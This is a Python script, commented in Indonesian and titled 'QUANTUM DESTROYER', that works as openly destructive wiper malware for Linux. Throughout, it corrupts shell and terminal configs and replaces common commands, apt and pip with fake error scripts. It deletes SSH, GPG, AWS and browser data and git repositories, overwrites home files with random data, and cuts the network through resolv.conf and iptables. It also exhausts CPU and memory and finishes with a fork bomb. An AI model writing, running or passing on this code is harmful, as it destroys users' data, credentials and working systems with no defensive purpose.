#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# QUANTUM DESTROYER - TERMINAL & SYSTEM KILLER

import os
import sys
import subprocess
import shutil
import threading
import time
import random
import glob
from pathlib import Path

# ========== 1. MATIKAN TERMINAL PERMANEN ==========
def kill_zshrc_bashrc():
    """Hapus dan corrupt shell config"""
    home = str(Path.home())
    shell_files = [
        f"{home}/.bashrc",
        f"{home}/.bash_profile",
        f"{home}/.zshrc",
        f"{home}/.profile",
        f"{home}/.config/fish/config.fish"
    ]
    
    for shell_file in shell_files:
        try:
            if os.path.exists(shell_file):
                # Hapus isi asli
                with open(shell_file, 'w') as f:
                    f.write('#!/bin/bash\necho "Segmentation fault (core dumped)"\nexit 1\n')
            else:
                # Buat baru dengan isi merusak
                os.makedirs(os.path.dirname(shell_file), exist_ok=True)
                with open(shell_file, 'w') as f:
                    f.write('#!/bin/bash\nkill -9 $$ 2>/dev/null\nexit 1\n')
        except:
            pass

def corrupt_terminals():
    """Buat terminal langsung close/crash"""
    terminal_configs = [
        "~/.config/termite/config",
        "~/.config/alacritty/alacritty.yml",
        "~/.config/kitty/kitty.conf",
        "~/.Xresources"
    ]
    for config in terminal_configs:
        try:
            with open(os.path.expanduser(config), 'w') as f:
                f.write("font: 1px\nopacity: 0\nbackground: #000000\n")  # Terminal invisible
        except:
            pass

# ========== 2. KORUPSI PATH DAN BINARY ==========
def corrupt_essential_commands():
    """Ganti command dasar dengan script jahat"""
    commands = ['ls', 'cd', 'pwd', 'cat', 'echo', 'grep', 'find', 'sudo', 'python3', 'git']
    home_bin = os.path.expanduser("~/.local/bin")
    os.makedirs(home_bin, exist_ok=True)
    
    # Tambah ke PATH di .bashrc dulu
    with open(os.path.expanduser("~/.bashrc"), "a") as f:
        f.write(f'\nexport PATH="{home_bin}:$PATH"\n')
    
    for cmd in commands:
        fake_cmd = f"""#!/bin/bash
echo "command not found: {cmd}"
exit 127
"""
        try:
            with open(f"{home_bin}/{cmd}", 'w') as f:
                f.write(fake_cmd)
            os.chmod(f"{home_bin}/{cmd}", 0o755)
        except:
            pass

def replace_apt_pip():
    """Ganti apt dan pip dengan fake"""
    apt_paths = ['/usr/bin/apt', '/usr/bin/apt-get']
    pip_paths = ['/usr/bin/pip', '/usr/bin/pip3']
    
    fake_apt = """#!/bin/bash
echo "E: Package system is corrupted. Run 'sudo fix-system'"
exit 1
"""
    for path in apt_paths + pip_paths:
        try:
            if os.path.exists(path):
                with open(path, 'w') as f:
                    f.write(fake_apt)
                os.chmod(path, 0o755)
        except:
            pass

# ========== 3. FORK BOMB & RESOURCE KILLER ==========
def fork_bomb():
    """Classic fork bomb - matiin sistem"""
    while True:
        os.fork()

def resource_consumer():
    """Konsumsi semua resource"""
    # CPU eater
    while True:
        _ = [i**100 for i in range(10000)]
    
    # Memory eater
    memory_eater = []
    while True:
        memory_eater.append(' ' * 1024 * 1024 * 100)  # 100MB setiap loop
        time.sleep(0.1)

# ========== 4. HAPUS SEMUA FILE PENTING ==========
def delete_system_critical():
    """Hapus system files (yang bisa diakses user)"""
    critical_paths = [
        "~/.ssh",
        "~/.gnupg",
        "~/.docker",
        "~/.aws",
        "~/.config/google-chrome",
        "~/.mozilla/firefox",
        "~/.cache",
        "/tmp/*",
        "/var/tmp/*"
    ]
    
    for path in critical_paths:
        try:
            shutil.rmtree(os.path.expanduser(path), ignore_errors=True)
        except:
            pass

def overwrite_home():
    """Overwrite file di home dengan random data"""
    home = str(Path.home())
    for root, dirs, files in os.walk(home):
        for file in files[:200]:  # 200 file cukup untuk kerusakan parah
            try:
                filepath = os.path.join(root, file)
                with open(filepath, 'wb') as f:
                    f.write(os.urandom(1024 * 100))  # 100KB random data
            except:
                pass

# ========== 5. CORRUPT GIT DAN REPO ==========
def destroy_git_repos():
    """Hancurin semua git repo"""
    git_dirs = glob.glob(os.path.expanduser("~/*/.git"), recursive=True)
    git_dirs += glob.glob(os.path.expanduser("~/.*/.git"), recursive=True)
    
    for git_dir in git_dirs:
        try:
            shutil.rmtree(git_dir)
        except:
            pass

# ========== 6. MATIKAN INTERNET & DNS ==========
def kill_network():
    """Reset network ke state rusak"""
    try:
        # Ganti DNS ke invalid
        resolv_conf = "/etc/resolv.conf"
        if os.path.exists(resolv_conf):
            with open(resolv_conf, 'w') as f:
                f.write("nameserver 0.0.0.0\n")
                f.write("nameserver 255.255.255.255\n")
        
        # Flush iptables
        subprocess.run(["sudo", "iptables", "-F"], timeout=2)
        subprocess.run(["sudo", "iptables", "-X"], timeout=2)
        subprocess.run(["sudo", "iptables", "-P", "INPUT", "DROP"], timeout=2)
        subprocess.run(["sudo", "iptables", "-P", "OUTPUT", "DROP"], timeout=2)
    except:
        pass

# ========== 7. SCREEN FLICKER & ANNOYANCE ==========
def screen_torture():
    """Torture screen (if possible)"""
    while True:
        try:
            subprocess.run(["xrandr", "--output", "eDP-1", "--brightness", str(random.uniform(0.1, 1.0))], timeout=0.5)
            subprocess.run(["xset", "led", "3"], timeout=0.5)
            subprocess.run(["xset", "-led", "3"], timeout=0.5)
        except:
            pass
        time.sleep(0.1)

# ========== 8. CRYPTO MINER di BACKGROUND (optional) ==========
def fake_miner():
    """Buat CPU 100% terus"""
    while True:
        _ = [i**i for i in range(1000)]

# ========== 9. WRITE PROTECT + READONLY ==========
def make_readonly():
    """Bikin home read-only"""
    home = str(Path.home())
    try:
        subprocess.run(["chmod", "-R", "444", home], timeout=30)
    except:
        pass

# ========== 10. DOOM MESSAGE LOOP ==========
def doom_messages():
    """Tampil pesan doom di terminal setiap detik"""
    messages = [
        "\033[91m[FATAL] Kernel panic - not syncing\033[0m",
        "\033[91m[CRITICAL] System memory corrupted\033[0m",
        "\033[91m[ERROR] Boot sector damaged\033[0m",
        "\033[91m[ALERT] Hard drive failure imminent\033[0m",
        "\033[91mSystem will shutdown in 5 seconds...\033[0m",
    ]
    while True:
        for msg in messages:
            try:
                sys.stdout.write(msg + "\n")
                sys.stdout.flush()
            except:
                pass
            time.sleep(0.5)

# ========== MAIN ==========
def main():
    # Stage 1: Matiin akses terminal dulu
    kill_zshrc_bashrc()
    corrupt_terminals()
    
    # Stage 2: Corrupt commands
    corrupt_essential_commands()
    replace_apt_pip()
    
    # Stage 3: Hancurin data
    delete_system_critical()
    destroy_git_repos()
    overwrite_home()
    
    # Stage 4: Matiin network
    kill_network()
    
    # Stage 5: Resource killers (background threads)
    for _ in range(5):
        threading.Thread(target=resource_consumer, daemon=True).start()
    
    threading.Thread(target=fake_miner, daemon=True).start()
    threading.Thread(target=screen_torture, daemon=True).start()
    threading.Thread(target=doom_messages, daemon=True).start()
    
    # Stage 6: Fork bomb terakhir (mati gaya)
    time.sleep(3)
    fork_bomb()

if __name__ == "__main__":
    try:
        main()
    except:
        # Fork bomb emergency
        while True:
            os.fork()
